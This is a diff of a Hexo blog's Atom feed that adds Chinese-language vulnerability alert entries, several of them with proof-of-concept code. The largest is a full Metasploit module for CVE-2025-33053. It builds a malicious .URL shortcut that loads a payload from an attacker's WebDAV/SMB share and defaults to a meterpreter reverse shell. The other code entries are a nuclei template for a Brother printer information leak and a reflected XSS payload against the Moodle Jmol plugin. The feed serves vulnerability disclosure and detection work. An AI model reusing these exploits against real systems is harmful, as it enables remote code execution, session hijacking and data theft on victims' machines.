@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-25T09:15:24.931Z</updated>
+  <updated>2025-06-25T09:45:36.754Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,167 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Brother MFC-L9570CDW 信息泄露漏洞</title>
+    <link href="http://example.com/2025/06/25/github_3325228875/"/>
+    <id>http://example.com/2025/06/25/github_3325228875/</id>
+    <published>2025-06-25T09:45:36.759Z</published>
+    <updated>2025-06-25T09:45:36.754Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Brother MFC-L9570CDW 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-51977</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Brother MFC-L9570CDW打印机存在信息泄露漏洞，攻击者可以通过发送特定的HTTP请求获取敏感信息，如模型名称和IP地址。</p><p><strong>产品厂商：</strong> Brother</p><p><strong>产品名称：</strong> Brother MFC-L9570CDW</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/1f1697fcb6a0791d368d67137caab5a0cb4add06/http%2Fcves%2F2024%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/1f1697fcb6a0791d368d67137caab5a0cb4add06/http%2Fcves%2F2024%2FCVE-2024-51977.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2024-51977</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Brother MFC-L9570CDW - Information Disclosure</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DhiyaneshDK</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">medium</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2024,printer,info-disclosure</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">GET /etc/mnt_info.csv HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&quot;Model Name&quot;&#x27;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&quot;IP Address&quot;&#x27;</span><br>        <span class="hljs-attribute">condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">content_type</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;text/comma-separated-values&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Brother MFC-L9570CDW 信息泄露漏洞&lt;/p&gt;
+&lt;p&gt;&lt;str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2025-33053 Exploit via Malicious URL File and WebDAV</title>
+    <link href="http://example.com/2025/06/25/github_1104844840/"/>
+    <id>http://example.com/2025/06/25/github_1104844840/</id>
+    <published>2025-06-25T09:45:27.010Z</published>
+    <updated>2025-06-25T09:45:27.006Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-33053</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块通过生成恶意的.URL文件，指向一个受信任的LOLBAS二进制文件，并设计参数以触发意外行为，从而利用CVE-2025-33053漏洞。可选地，生成一个有效载荷并托管在指定的WebDAV目录上。当受害者打开快捷方式时，它将尝试访问WebDAV路径，可能通过受信任的二进制文件导致远程代码执行。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/fde78bf73f1b5fdf145fe2ea82a820bc7c6f22ab/modules%2Fexploits%2Fwindows%2Ffileformat%2Func_url_cve_2025_33053.rb">https://github.com/rapid7/metasploit-framework/blob/fde78bf73f1b5fdf145fe2ea82a820bc7c6f22ab/modules%2Fexploits%2Fwindows%2Ffileformat%2Func_url_cve_2025_33053.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>##<br># This module requires Metasploit: https://metasploit.com/download<br># <span class="hljs-keyword">Current</span> source: https://github.com/rapid7/metasploit-framework<br>##<br><br><span class="hljs-keyword">class</span> MetasploitModule &lt; Msf::Exploit::Remote<br>  Rank = NormalRanking<br><br>  <span class="hljs-keyword">include</span> Msf::Exploit::Remote::SMB::<span class="hljs-keyword">Server</span>::<span class="hljs-keyword">Share</span><br>  <span class="hljs-keyword">include</span> Msf::Exploit::Remote::SMB::<span class="hljs-keyword">Server</span>::HashCapture<br>  <span class="hljs-keyword">include</span> Msf::Exploit::FILEFORMAT<br>  <span class="hljs-keyword">include</span> Msf::Exploit::EXE<br><br>  def initialize(<span class="hljs-keyword">info</span> = &#123;&#125;)<br>    super(<br>      update_info(<br>        <span class="hljs-keyword">info</span>,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;CVE-2025-33053 Exploit via Malicious .URL File and WebDAV&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits CVE<span class="hljs-number">-2025</span><span class="hljs-number">-33053</span> <span class="hljs-keyword">by</span> generating a malicious .URL file pointing<br>          <span class="hljs-keyword">to</span> a <span class="hljs-keyword">trusted</span> LOLBAS binary <span class="hljs-keyword">with</span> parameters designed <span class="hljs-keyword">to</span> <span class="hljs-keyword">trigger</span> unintended behavior.<br>          Optionally, a payload <span class="hljs-keyword">is</span> <span class="hljs-keyword">generated</span> <span class="hljs-keyword">and</span> hosted <span class="hljs-keyword">on</span> a specified WebDAV directory.<br>          <span class="hljs-keyword">When</span> the victim opens the shortcut, it will attempt <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> the WebDAV <span class="hljs-type">path</span>,<br>          potentially resulting <span class="hljs-keyword">in</span> remote code execution via a <span class="hljs-keyword">trusted</span> binary.<br>        &#125;,<br><br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Alexandra Gofman&#x27;</span>, # vuln research<br>          <span class="hljs-string">&#x27;David Driker&#x27;</span>, # vuln research<br>          <span class="hljs-string">&#x27;Dev Bui Hieu&#x27;</span> # module dev<br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-11&#x27;</span>,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-33053&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;win&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ARCH_X64, ARCH_X86, ARCH_AARCH64],<br>        <span class="hljs-string">&#x27;Passive&#x27;</span> =&gt; <span class="hljs-keyword">true</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [[<span class="hljs-string">&#x27;Windows (generic)&#x27;</span>, &#123;&#125;]],<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;FOLDER_NAME&#x27;</span> =&gt; <span class="hljs-string">&#x27;webdav&#x27;</span>,<br>          <span class="hljs-string">&#x27;FILE_NAME&#x27;</span> =&gt; <span class="hljs-string">&#x27;explorer.exe&#x27;</span>,<br>          <span class="hljs-string">&#x27;DisablePayloadHandler&#x27;</span> =&gt; <span class="hljs-keyword">false</span>,<br>          <span class="hljs-string">&#x27;Payload&#x27;</span> =&gt; <span class="hljs-string">&#x27;windows/x64/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION]<br>        &#125;<br>      )<br>    )<br><br>    register_options(<br>      [<br>        OptString.<span class="hljs-built_in">new</span>(<span class="hljs-string">&#x27;OUTFILE&#x27;</span>, [<span class="hljs-keyword">false</span>, <span class="hljs-string">&#x27;Output URL file name&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]),<br>      ], self.<span class="hljs-keyword">class</span><br>    )<br>  <span class="hljs-keyword">end</span><br><br>  def exploit_remote_load<br>    start_service<br>    print_status(<span class="hljs-string">&#x27;The SMB service has been started.&#x27;</span>)<br><br>    self.file_contents = generate_payload_exe<br>  <span class="hljs-keyword">end</span><br><br>  def exploit<br>    write_url_file<br>    exploit_remote_load<br><br>    stime = <span class="hljs-type">Time</span>.now.to_f<br>    timeout = datastore[<span class="hljs-string">&#x27;ListenerTimeout&#x27;</span>].to_i<br>    <span class="hljs-keyword">loop</span> <span class="hljs-keyword">do</span><br>      break <span class="hljs-keyword">if</span> timeout &gt; <span class="hljs-number">0</span> &amp;&amp; (stime + timeout &lt; <span class="hljs-type">Time</span>.now.to_f)<br><br>      Rex::ThreadSafe.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  def write_url_file<br>    content = generate_url_content<br>    outfile = datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>].blank? ? %(#&#123;Rex::<span class="hljs-type">Text</span>.rand_text_alphanumeric(<span class="hljs-number">8</span>)&#125;.url) : datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>]<br>    <span class="hljs-type">path</span> = store_local(<span class="hljs-string">&#x27;webdav.url&#x27;</span>, nil, content, outfile)<br>    print_status(&quot;URL file: #&#123;path&#125;, deliver to target&#x27;s machine and wait for shell.&quot;)<br>  <span class="hljs-keyword">end</span><br><br>  def generate_url_content<br>    &lt;&lt;~URLFILE<br>      [InternetShortcut]<br>      URL=C:\\Windows\\System32\\CustomShellHost.exe<br>      WorkingDirectory=\\\\#&#123;srvhost&#125;\\#&#123;<span class="hljs-keyword">share</span>&#125;\\#&#123;folder_name&#125;\\<br>      ShowCommand=<span class="hljs-number">7</span><br>      IconIndex=<span class="hljs-number">13</span><br>      IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br>      Modified=<span class="hljs-number">20</span>F06BA06D07BD014D<br>    URLFILE<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-33053 Exploit via Malicious .U</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="rapid7/metasploit-framework:github commit" scheme="http://example.com/tags/rapid7-metasploit-framework-github-commit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Moodle LMS Jmol Plugin 跨站可执行脚本漏洞</title>
+    <link href="http://example.com/2025/06/25/github_3172830154/"/>
+    <id>http://example.com/2025/06/25/github_3172830154/</id>
+    <published>2025-06-25T09:45:14.921Z</published>
+    <updated>2025-06-25T09:45:14.918Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Moodle LMS Jmol Plugin 跨站可执行脚本漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-34032</li></ul><p><strong>漏洞类型：</strong> 跨站可执行脚本</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Moodle LMS Jmol插件6.1及之前版本中存在反射型跨站脚本(XSS)漏洞，攻击者可以通过构造恶意链接，利用jsmol.php中的data参数，在受害者浏览器中执行任意JavaScript代码。此漏洞可用于劫持用户会话或操纵页面内容。</p><p><strong>产品厂商：</strong> Moodle</p><p><strong>产品名称：</strong> Moodle LMS Jmol Plugin</p><p><strong>影响版本：</strong> &lt;&#x3D; 6.1</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/1702536e52c4d793b32eac012720289d654058e6/http%2Fcves%2F2025%2FCVE-2025-34032.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/1702536e52c4d793b32eac012720289d654058e6/http%2Fcves%2F2025%2FCVE-2025-34032.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs less"><br>id: CVE-2025-34032<br><br>info:<br>  name: Moodle LMS Jmol Plugin &lt;= 6.1 - Cross-Site Scripting<br>  author: madrobot<br>  severity: medium<br>  description: |<br>    A reflected cross-site scripting (XSS) vulnerability exists in the Moodle LMS Jmol plugin version 6.1 and prior via the data parameter in jsmol.php. The application fails to properly sanitize user input before embedding it into the HTTP response, allowing an attacker to execute arbitrary JavaScript in the victim&#x27;s browser by crafting a malicious link. This can be used to hijack user sessions or manipulate <span class="hljs-attribute">page content.</span><br><span class="hljs-attribute">  reference</span>:<br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities/</span><br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nvd.nist.gov/vuln/detail/CVE-2025-34032</span><br>  <span class="hljs-attribute">classification</span>:<br>    <span class="hljs-attribute">cvss-metrics</span>: <span class="hljs-attribute">CVSS</span>:<span class="hljs-number">3.1</span>/<span class="hljs-attribute">AV</span>:N/<span class="hljs-attribute">AC</span>:L/<span class="hljs-attribute">PR</span>:L/<span class="hljs-attribute">UI</span>:R/<span class="hljs-attribute">S</span>:C/<span class="hljs-attribute">C</span>:L/<span class="hljs-attribute">I</span>:L/<span class="hljs-attribute">A</span>:N<br>    <span class="hljs-attribute">cve-id</span>: CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">34032</span><br>    <span class="hljs-attribute">cvss-score</span>: <span class="hljs-number">5.4</span><br>    <span class="hljs-attribute">cwe-id</span>: CWE-<span class="hljs-number">80</span><br>  <span class="hljs-attribute">metadata</span>:<br>    <span class="hljs-attribute">max-request</span>: <span class="hljs-number">1</span><br>  <span class="hljs-attribute">tags</span>: cve,cve2025,moodle,xss,edb<br><br><span class="hljs-attribute">http</span>:<br>  - <span class="hljs-attribute">method</span>: GET<br>    <span class="hljs-attribute">path</span>:<br>      - <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&amp;data=%3Cscript%3Ealert(document.domain)%3C/script%3E&amp;mimetype=text/html&quot;</span><br><br>    <span class="hljs-attribute">matchers-condition</span>: <span class="hljs-keyword">and</span><br>    <span class="hljs-attribute">matchers</span>:<br>      - <span class="hljs-attribute">type</span>: word<br>        <span class="hljs-attribute">part</span>: body<br>        <span class="hljs-attribute">words</span>:<br>          - <span class="hljs-string">&quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</span><br><br>      - <span class="hljs-attribute">type</span>: word<br>        <span class="hljs-attribute">part</span>: header<br>        <span class="hljs-attribute">words</span>:<br>          - <span class="hljs-string">&quot;text/html&quot;</span><br><br>      - <span class="hljs-attribute">type</span>: status<br>        <span class="hljs-attribute">status</span>:<br>          - <span class="hljs-number">200</span><br># <span class="hljs-attribute">digest</span>: <span class="hljs-number">490</span><span class="hljs-attribute">a0046304402202ce4ab09dfbb0d1a283ed44ecf36d605d0ca9b1daf7c865bc6dff2377cae6fe302201755c894c9fb9d830625ffad6822664793240ae4e1f14fd340b92b5c2be20517</span>:<span class="hljs-number">922</span>c64590222798bb761d5b6d8e72950<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Moodle LMS Jmol Plugin 跨站可执行脚本漏洞&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="跨站可执行脚本" scheme="http://example.com/tags/%E8%B7%A8%E7%AB%99%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【高危漏洞预警】Pterodactyl代码执行漏洞(CVE-2025-49132)</title>
+    <link href="http://example.com/2025/06/25/weixin_3348143874/"/>
+    <id>http://example.com/2025/06/25/weixin_3348143874/</id>
+    <published>2025-06-25T09:43:10.224Z</published>
+    <updated>2025-06-25T09:43:10.223Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/pUJjIAJDyd3r1kV-WbQGUA">https://mp.weixin.qq.com/s/pUJjIAJDyd3r1kV-WbQGUA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/pUJjIAJDyd3r1kV-WbQGUA&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【高危漏洞预警】 Gogs内部文件删除致远程命令注入漏洞</title>
+    <link href="http://example.com/2025/06/25/weixin_2204491623/"/>
+    <id>http://example.com/2025/06/25/weixin_2204491623/</id>
+    <published>2025-06-25T09:43:09.838Z</published>
+    <updated>2025-06-25T09:43:09.835Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/NoEos95najM7GolqppR4-g">https://mp.weixin.qq.com/s/NoEos95najM7GolqppR4-g</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/NoEos95najM7GolqppR4-g&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>外媒狗鼻子是真灵，科学家发论文立马引来污蔑</title>
+    <link href="http://example.com/2025/06/25/weixin_3987701709/"/>
+    <id>http://example.com/2025/06/25/weixin_3987701709/</id>
+    <published>2025-06-25T09:40:35.469Z</published>
+    <updated>2025-06-25T09:40:35.467Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/2onSwUM5ga-zDZSzh5Z8GQ">https://mp.weixin.qq.com/s/2onSwUM5ga-zDZSzh5Z8GQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/2onSwUM5ga-zDZSzh5Z8GQ&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Internet Shortcut UNC路径漏洞</title>
@@ -380,168 +541,6 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-ldjDRwgYP1plj5CAV10Aw&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>以色列-伊朗网络战攻防，“第二战场”持续加速升级</title>
